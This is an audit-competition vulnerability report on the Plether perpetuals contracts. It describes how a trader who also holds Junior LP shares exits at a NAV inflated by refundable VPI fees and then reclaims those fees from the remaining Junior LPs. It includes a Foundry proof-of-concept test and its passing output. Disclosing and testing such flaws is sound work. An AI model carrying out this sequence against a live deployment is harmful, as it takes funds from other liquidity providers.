# \#98689 [SC-Critical] A trader who is also a Junior LP can exit at an inflated share price and take the VPI back from the remaining Junior LPs

**Submitted on Nov 9th 2026 at 15:52:02 UTC by @xKeywordx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98689
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Description
A trader who also holds a large Junior LP position can steal from the other Junior LPs. The trader pays the VPI fee into the pool, cashes out their Junior shares while the pool counts that fee as Junior profit, then closes the position and gets the whole VPI fee back. The refund is paid by the Junior LPs who remain in the pool. No price movement is needed.

VPI is the protocol's skew fee. A trade that makes the Long/Short imbalance worse pays VPI into the pool; a trade that reduces it gets VPI back. On close, `CloseAccountingLib` clamps a position's lifetime VPI at zero, so a position that paid VPI to open gets back at most what it paid. Positive VPI therefore works like a deposit that the trader can take back.

However, the pool does not treat VPI as a deposit. The VPI is booked as revenue the moment it is paid, credited to Junior principal at the next LP settlement, and Junior redemptions are priced based on that principal. Nothing in LP NAV says the money will be paid back.

This allows a whale Junior LP who is also a trader to do the following:

1. Request redemption of all its Junior shares for the next hourly LP epoch.
2. Before that epoch settles, open a large skew-creating position. The VPI it pays is booked as Junior revenue.
3. The epoch settles (anyone can call `OrderRouter.settleLpEpoch`). The whale's redemption is priced at the inflated Junior NAV.
4. Close the position at the same price. The lifetime clamp refunds the full VPI from pool cash, and the Junior LPs who remain in the pool absorb the refund as a loss.

The honest Junior LPs lose funds. In the PoC below, an honest Junior LP with 10M USDG loses about 67.5k USDG in one round, and the whale gains about 47.6k USDG after paying all fees. The POC uses the release parameters from `packages/perps/DEPLOYMENT.md` (vpiFactor 0.01e18, 40% skew cap, 0.04% execution fee, 0.2%/0.1% margins) and the release Senior limits (40M USDG and 80%).

## Root cause
LP NAV counts refundable positive VPI as earned Junior equity. Opening books the VPI as final revenue, the reconcile gives it to Junior, and the close refunds it from the same pool.

Looking at the `CfdEngineSettlementSidecar.sol` contract, the `executeOpen` function records the VPI part of the trade cost as Revenue/CashArrived:

```solidity
    if (delta.tradeCostAssets > 0) {
        uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
        ...
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
```

`HousePool.recordClaimantInflow` then adds it to `accountedAssets`. In `HousePoolAccountingLib.sol`, `buildReconcileSnapshot` prices LP equity as physical assets minus trader claims, with no line for VPI the pool may have to refund:

```solidity
    uint256 terminalAssets = engineSnapshot.physicalAssets;                 // includes the VPI cash
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;  // no Σ max(vpiAccrued, 0)
    ...  // adds the open positions' marked price PnL (zero here, the price never moves); no VPI term
    snapshot.distributable = terminalAssets - terminalLiabilities;
```

The surplus goes to Junior and `HousePool._settleLpEpoch` prices Junior exits from it right after reconciling:

```solidity
    _reconcile(accountingSnapshot, statusSnapshot);
    ...
    juniorPhase.pricingPrincipal = juniorPrincipal;
```

On close, `CloseAccountingLib.buildCloseState` guarantees the refund:

```solidity
    state.proportionalAccrualAssets = (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
    ...
    if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
        state.vpiDeltaAssets = -state.proportionalAccrualAssets;   // full accrued VPI back
    }
```

`CfdEngineSettlementSidecar._executeClose` pays it from the pool (`pool.payOut(...)`), and `HousePoolWaterfallAccountingLib.absorbLoss` charges it to Junior first.

The protocol only protects the opposite direction. Negative VPI (a rebate the trader received) must be backed by a reserve in the trader's account that the trader cannot withdraw and that LPs cannot count as equity until the position settles. Positive VPI has no equivalent: LPs can withdraw it before the position that paid it has settled.

## Impact

**Critical: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

- Funds loss: Junior LPs who stay in the pool lose principal. The whale's redemption includes its share of the VPI it has just paid. When it closes, the pool pays that same VPI back to the whale's position. The whale is no longer a Junior LP at that point, so the refund is charged entirely to the Junior LPs who stayed. Their loss equals the whale's gain plus the open execution fee paid to the treasury.

Additional context about why this is a new issue and not a duplicate based on previous reports and this Audit Comp rules

**Broken promises and assumptions:**

- SECURITY.md, "Exact symmetric LP NAV": "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV". Here the reverse happens: exiting LPs leave with value that is still owed back to the trader, and the remaining LPs inherit that obligation.
- WHITEPAPER.md §5.1 "Virtual price impact" (`packages/perps/WHITEPAPER.md`) says of the negative VPI reserve: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles." ACCOUNTING_SPEC.md says the same: the VPI reserve "cannot be extracted by LPs before its account obligation settles". Both statements only cover negative VPI. Positive VPI is tied to an open position in the same way, because the clamp lets the trader take it back, but nothing stops LPs from withdrawing it before that position settles.

## Recommended mitigation
Treat positive VPI as unearned until the position that paid it closes. Track the refundable amount separately in the engine and subtract it in the LP NAV snapshot. When the position closes, its accrued VPI leaves the total. Any part that was not refunded then shows up in NAV as real revenue, and any part that was refunded was never counted. The same total can also be added to the LP withdrawal reserve, so refunds are always payable. With this change, the whale's exit is priced without the VPI, so the round trip becomes a pure cost for it (two execution fees and carry).

## Proof of Concept

## Proof of Concept

Put the following POC in the existing `VpiRoundTripAccounting.t` file and run it:

```solidity
/// @notice PoC: positive VPI paid at open is booked as Junior revenue, but the lifetime clamp refunds it in full on the
///         skew-reducing close. A Junior LP who is also the trader exits at the VPI-inflated NAV, then closes for the
///         refund, which the remaining Junior LPs fund. Release risk parameters and Senior limits based on DEPLOYMENT.md.
contract JuniorExitVpiRoundTripTest is BasePerpTest {

    address honestJunior = address(0x111);
    address seniorLp = address(0x222);
    address whale = address(0x333);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Matures the redeem epoch and settles it against a fresh mark, as `_fundTrancheAsync` does for deposits.
    function _settleRedeemEpoch(
        uint256 redeemId
    ) internal {
        vm.warp(juniorVault.depositEpochStart(redeemId) + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
    }

    /// @dev accounting; source: ACCOUNTING_SPEC.md#close-settlement.
    function test_JuniorExitCapturesRefundableVpi() public {
        // Release Senior limits: 40M absolute and 80% share. Senior is filled to the cap against a 10M honest Junior.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(honestJunior, 10_000_000e6);
        _fundSenior(seniorLp, 39_998_000e6);

        // Whale is the dominant Junior LP and also trades.
        _fundJunior(whale, 75_000_000e6);
        _fundTrader(whale, 1_200_000e6);
        uint256 whaleStart = 75_000_000e6 + clearinghouse.balanceAssets(whale);
        uint256 whaleShares = juniorVault.balanceOf(whale);
        uint256 honestShares = juniorVault.balanceOf(honestJunior);

        // After the deposit cooldown, the whale requests redemption of all of its Junior shares.
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        vm.prank(whale);
        uint256 redeemId = juniorVault.requestRedeem(whaleShares, whale, whale);

        // Baseline from the same state: the redemption settles with no trade.
        uint256 snapshot = vm.snapshotState();
        _settleRedeemEpoch(redeemId);
        uint256 baselineRedemption = juniorVault.claimableRedeemAssets(redeemId, whale);
        uint256 baselineHonest = juniorVault.convertToAssets(honestShares);
        vm.revertToState(snapshot);

        // 1) Before the epoch settles, the whale opens a skew-creating LONG and pays VPI into the pool.
        _open(whale, CfdTypes.Side.LONG, 49_800_000e18, 600_000e6, 1e8);
        (,,,,,, int256 vpiAccrued) = engine.positions(whale);
        assertGt(vpiAccrued, 0, "skew-creating open pays positive VPI");

        // 2) The redemption settles at a Junior NAV that includes the refundable VPI.
        _settleRedeemEpoch(redeemId);
        uint256 attackRedemption = juniorVault.claimableRedeemAssets(redeemId, whale);
        assertGt(attackRedemption, baselineRedemption, "exit is priced with the VPI booked as Junior revenue");

        // 3) The whale closes at the same price; the lifetime clamp refunds the whole VPI from pool cash.
        _close(whale, CfdTypes.Side.LONG, 49_800_000e18, 1e8);
        uint256 maxShares = juniorVault.maxRedeem(whale);
        vm.prank(whale);
        juniorVault.redeem(maxShares, whale, whale);

        uint256 whaleEnd = settlementToken.balanceOf(whale) + clearinghouse.balanceAssets(whale);
        uint256 honestAfter = juniorVault.convertToAssets(honestShares);

        // No price move: the whale profits after both execution fees and the honest Junior LP pays for it.
        assertGt(whaleEnd, whaleStart, "whale profits from the VPI round trip");
        assertLt(honestAfter, baselineHonest, "remaining Junior LP funds the refund");
        assertGt(baselineHonest - honestAfter, whaleEnd - whaleStart, "honest loss covers the whale's profit");
    }

}
```

Test output
```solidity
forge test --mt test_JuniorExitCapturesRefundableVpi -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/perps/accounting/close/VpiRoundTripAccounting.t.sol:JuniorExitVpiRoundTripTest
[PASS] test_JuniorExitCapturesRefundableVpi() (gas: 4626370)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.03ms (5.63ms CPU time)

Ran 1 test suite in 12.86ms (12.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
